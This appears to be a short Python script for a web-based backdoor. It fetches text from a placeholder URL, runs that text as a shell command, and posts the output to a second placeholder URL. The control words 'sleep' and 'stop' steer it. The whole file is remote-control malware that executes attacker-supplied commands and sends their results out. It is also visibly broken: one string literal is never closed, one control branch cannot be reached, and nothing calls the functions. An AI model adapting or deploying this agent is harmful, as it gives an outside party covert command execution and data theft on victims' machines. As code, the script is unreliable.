import requests
import sys
import subprocess
url = "Website link to read from"
url1 = "Website link with a php script to write data
def sleep_check():
    req = requests.get(url)
    req1 = req.text
    if req1 != 'sleep':
        web()
def web():
    r = requests.get(url)
    r1 = r.text
    if r1 != 'stop':
        web = subprocess.Popen(r1, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        res = web.stdout.read()
        par= {'data':res}
        requests.post(url1, params=par)
    elif r1 == 'sleep':
        sleep_check()
    elif r1 == 'stop':
        sys.exit(0)
